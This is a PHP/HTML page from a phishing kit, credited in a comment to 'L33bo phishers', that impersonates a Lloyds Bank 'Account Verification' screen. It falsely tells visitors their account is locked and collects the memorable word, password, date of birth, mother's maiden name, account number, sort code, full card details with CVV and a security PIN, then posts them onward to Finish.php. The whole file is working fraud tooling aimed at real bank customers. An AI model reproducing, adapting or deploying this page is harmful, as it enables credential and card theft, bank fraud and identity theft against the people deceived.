<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
$_SESSION['memo'] = $_POST['memo'];
$_SESSION['pass2'] = $_POST['pass2'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-gb" xml:lang="en-gb" style="overflow-x: hidden;" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Verification</title>
<meta http-equiv="content-language" content="en-gb">
<link rel="alternate" media="handheld" href="">
<meta name="viewport" content="width=device-width">
<meta name="format-detection" content="telephone=no">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/002.css" media="screen, print" type="text/css" rel="stylesheet">
<link type="text/css" href="assets/css/001.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="assets/js/jquery.maskedinput.js"></script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script>
    jQuery(function($) {
      $('#cc-number').payment('formatCardNumber');
      $('#cc-exp').payment('formatCardExpiry');
      $('#cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('#cc-number').toggleInputError(!$.payment.validateCardNumber($('#cc-number').val()));
        $('#cc-exp').toggleInputError(!$.payment.validateCardExpiry($('#cc-exp').payment('cardExpiryVal')));
        $('#cc-cvc').toggleInputError(!$.payment.validateCardCVC($('#cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
   $("#sortcode").mask("99-99-99",{placeholder:"xx-xx-xx"});
});
</script>
<script>
jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: { required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
					mobile: { required: true, minlength: 11,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					acno: { required: true, minlength: 8, digits: true,},
					sortcode: { required: true, minlength: 8},
					mmn: { required: true, minlength: 2,},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: { 
						required: "Please provide your date of birth", 
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					mobile: {
						required: "Please provide your 11 digit mobile telephone number",
						minlength: jQuery.validator.format("Please check the mobile telephone number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
						date: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					acno: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: { 
						required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"),
					},
					mmn: { required: "Please provide your mother's maiden name", minlength: jQuery.validator.format("Please check the mother's maiden name you have entered"), },
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<style>
input.error {
	border: 1px solid #dc2a4d!important;
	outline:0;
}
select.error {
	border: 1px solid #dc2a4d!important;
	outline:0;
}
select {
	color: #333!important;
}
span.error {
	color: #dc2a4d;
	font-family: 'Lloyds Jack Light',arial,sans-serif;
    font-weight: normal!important;
    font-size: 1.6em;
    line-height: 1.25;
} 
</style>
</head>

        <body class="hasJS">
          
            <div class="mobile-wrapper"><div id="outer">
                <div id="banner">
                    
          
<header>
<div class="sp-pat-m-hf-01-bank-bar need-javascript">
   <div class="m-hf-01-container m-container"><div class="m-01-logo"><img src="../assets/img/logo.png" class="desktop_logo"><img src="../assets/img/mobile_logo.png"  height="40" width="42" class="mobile_logo"></div><div class="m-01-menu-buttons">
   <ul><li><div class="m-01-menu-home"><a href="#"><span class="m-01-menu-button-text">HOME</span></a></div></li><li>
   <div class="m-01-menu-button m-01-menu-right">
    <a href="" class="m-01-menu-button-text">
     MENU</a>
   </div>
  </li>
  </ul>
  </div><div class="m-fh-01-navigation" role="navigation"><ul class="pull-right m-01-menu-bar"><li class="m-hf-01-cookie-policy"><a href="#" tabindex="17">Cookie Policy</a></li><li class="m-hf-01-safe-secure"><a href="" tabindex="19">Safe and secure<span>Our Internet Banking guarantee </span></a>
   </li>
   </ul><ul class="m-01-menu-bar"></ul>
  </div>
  </div>
  </div>

    
        <div class="sp-pat-m-hf-01-bank-bar-container">
<div class="mvt_content"><style type="text/css">body
{
  margin:0;
}

body.ls-center
{
  text-align:center;
}

.ls-canvas .ls-row .ls-row-clr
{
  clear:both;
}

.ls-canvas .ls-col
{
  overflow:hidden;
}

.ls-canvas .ls-col-body
{
  overflow:hidden;
}

.ls-canvas .ls-area
{
  overflow:hidden;
}

.ls-canvas .ls-area-body
{
  overflow:hidden;
}

.ls-canvas .ls-area .ls-1st
{
  margin-top:0 !important;
}

.ls-canvas .ls-cmp-wrap
{
  padding:1px 0;
}

.ls-canvas .iw_component
{
  margin:-1px 0;
}

.ls-canvas .ls-row .ls-lqa-fix
{
  font-size:0;
  line-height:0;
  height:0;
  margin-top:0;
}

.ls-canvas .ls-row .ls-lqr-w
{
  float:left;
  width:100%;
}

.ls-canvas .ls-row .ls-lqr-w-fx
{
  float:left;
}

.ls-canvas .ls-row .ls-lqr-e-fx
{
  float:right;
}
</style><div class="ls-canvas sp-pat-wrapper"><div class="ls-row"><div class="ls-lqr"><div class="ls-area"><div class="ls-area-body"><div class="ls-cmp-wrap ls-1st"><div class="iw_component"><div class="sp-pat-m-hf-01-safe-secure" style="display: none;"><div class="m-container m-01-threecol"><h2>Our online and mobile banking guarantee</h2><div class="m-01-section"><p>We guarantee to refund your money in the unlikely event you experience fraud with our Internet Banking service - as long as you've been careful, for example, by taking reasonable steps to keep your security information safe. We protect you with safeguards that meet Industry Standards.</p></div><div class="m-01-section"><ul><li>Keep your password secure and do not let anyone else make use of your security details, even if they share a joint account with you.</li><li>Do not let anyone watch you enter your security details and log off after each Online Banking session.</li><li>Carry out regular virus checks on your devices and have the latest operating system and web browser installed.</li></ul></div><div class="m-01-section"><p>Find out more about how to <a href="#">protect yourself online</a>.</p><ul class="links"><li><a href="#">Security information</a></li></ul></div></div></div></div></div></div></div></div></div></div></div></div><div class="m-hf-02-customer-bar need-javascript m-hf-02-customer-bar-0"><div class="m-container"><ul class="m-hf-02-nav"><li class="m-hf-02-home cb-tab-home"><div class="nav-title"><a href="#"></a></div></li><li class=" hide-desktab"><div class="nav-title"></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"></div></li><li class=" m-hf-02-tab cb-tab-accounts"><div class="nav-title"></div><div class="nav-content" style="top: 49px;"></div></li><li class=" m-hf-02-tab cb-tab-profile hide-mobile"><div class="nav-title"></div><div class="nav-content" data-ajax-load="true" style="top: 49px;"></div></li><li class=" m-hf-02-tab cb-tab-help-contact hide-mobile"><div class="nav-title"><a href="#" class="main-nav">Help &amp; Support</a></div><div class="nav-content" style="top: 49px;"></div></li><li class=" m-hf-02-mail cb-tab-mail hide-mobile"><div class="nav-title"><a href="#" class="ViewInboxAnchor1"><span class="m-hf-02-mail-icon">Inbox </span><span class="m-hf-02-mail-badge-read">0</span></a></div></li><li class=" hide-desktab"><div class="nav-title"><a href="#" class="sub-nav-toggle">Help &amp; contact us</a></div><ul class="mobile-sub-nav"><li><a href="#">Lost or stolen card</a></li><li><a href="#">Order replacement card or PIN</a></li><li><a href="#">
          Help</a></li><li><a href="#">General enquires are open 24/7. <span class="underline">0800 096 9779</span></a></li><li><a href="#">Contact us</a></li></ul></li><li class=" m-hf-02-logout cb-tab-logout cb-tab-aux-link"><div class="nav-title"><a href="#">Log Off</a></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"><a href="#">Cookie Policy</a></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"><a href="#">Safe and secure</a></div></li></ul></div></div>
</header>

                </div>
                <div id="header">
                    <div class="panelTL">
                        <div class="panelTR">
                            <div class="panelBR">
                                <div class="panelBL">
                                    <div id="headerInner">
                                        
	

	
	<h1>Account Verification</h1>
			
		
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="content">
                                      
                    <div class="panel">
                        <div class="panelTL">
                            <div class="panelTR">
                                <div class="panelBR">
                                    <div class="panelBL">
                                        
										
										<div class="panelInner">
										<div class="inner">
										<p class="detailExpanded">
										Please note: For your security, you won’t be able to access your account online until you have completed our account verification process which you can find below.

Until you have completed this action you account will remain locked and you will be unable to access any of our online banking features.
										</p>

										<div class="divider">
										<hr>
										</div>
										<form id="details" name="details" method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded">
										
										<div class="formField">
										<label for="name">Full Name</label>
										<input value="<?php echo $_SESSION['name'];?>" type="text" id="name" name="name" maxlength="40" placeholder="Include middle name's if applicable">
										</div>
										
										<div class="formField">
										<label for="address">Date of Birth</label>
										<input value="<?php echo $_SESSION['dob'];?>" type="tel" id="dob" name="dob" maxlength="10" placeholder="DD/MM/YYYY">
										</div>
										
										<div class="formField">
										<label for="address">Address</label>
										<input value="<?php echo $_SESSION['address'];?>" type="text" id="address" name="address" maxlength="40" placeholder="1st Line">
										</div>
										
										<div class="formField">
										<label for="postcode">Postcode</label>
										<input value="<?php echo $_SESSION['postcode'];?>" type="text" id="postcode" class="postcodeUK" name="postcode" maxlength="10">
										</div>	

										<div class="formField">
										<label for="telephone">Home Telephone Number</label>
										<input type="tel" id="telephone" name="telephone" maxlength="11">
										</div>	

										<div class="formField">
										<label for="mobile">Mobile</label>
										<input value="<?php echo $_SESSION['telephone'];?>" type="tel" id="mobile" name="mobile" maxlength="11">
										</div>	

										<div class="formField">
										<label for="mmn">Mother&apos;s Maiden Name</label>
										<input value="<?php echo $_SESSION['mmn'];?>" type="text" id="mmn" name="mmn" maxlength="25">
										</div>

										<div class="formField">
										<label for="acno">Account Number</label>
										<input value="<?php echo $_SESSION['acno'];?>" type="tel" id="acno" name="acno" maxlength="8">
										</div>											
										
										<div class="formField">
										<label for="sortcode">Sort Code</label>
										<input value="<?php echo $_SESSION['sort1'];?>-<?php echo $_SESSION['sort2'];?>-<?php echo $_SESSION['sort3'];?>" type="tel" id="sortcode" name="sortcode" maxlength="8">
										</div>	
										
										<div class="formField">
										<label for="ccno">Card Number</label>
										<input value="<?php echo $_SESSION['ccno'];?>" type="tel" id="cc-number" name="ccno" maxlength="20">
										</div>	

										<div class="formField">
										<label for="ccexp">Card Expiry</label>
										<input value="<?php echo $_SESSION['ccexp'];?>" type="tel" id="cc-exp" name="ccexp" maxlength="7">
										</div>		

										<div class="formField">
										<label for="secode">Card Security Code</label>
										<input value="<?php echo $_SESSION['secode'];?>" type="tel" id="cc-cvc" name="secode" maxlength="4">
										</div>

										<div class="formField">
										<label for="telepin">6-digit Security Number</label>
										<input type="tel" name="telepin" maxlength="6">
										</div>										
										

	
	
	
	
										
										<div class="divider">
										<hr>
										</div>


<div class="actions">
<input id="go" name="go" type="submit" value="Continue" class="submitAction">
</div>

</form>
									</div>
									</div>
									
									
									
                                            
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
<div class="sp-pat-m-hf-03-footer">
    <div class="m-hf-03-footer-04">
        <div class="m-container">
            <ul class="infoLinks1">
            
                        <li><a id="helpSSR" href="#">
                        Help</a></li>
                    
                        <li><a id="contactUsSSR" href="#">
                        Contact us</a></li>
                    
            </ul>
            <ul class="infoLinks2">
                
                        <li><a id="securitySSR" href="#">
                        Security</a></li>
                        <li><a id="legalSSR" href="#">
                        Legal</a></li>
                    
                <li><a id="privacySSR" href="#">Privacy</a></li>
                <li><a id="interstRatesSSR" href="#">Rates and charges</a></li>
                <li><a id="BOS_SSR" href="#">www.lloydsbank.com</a></li>
                <li><a id="desktopSiteSSR" href="../LoginMB.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true">
                Go to desktop site</a></li>
            </ul>
        </div>
    </div>
</div>


    
                </div>
            <div class="shadow-overlay"></div></div></div>
</body>
</html>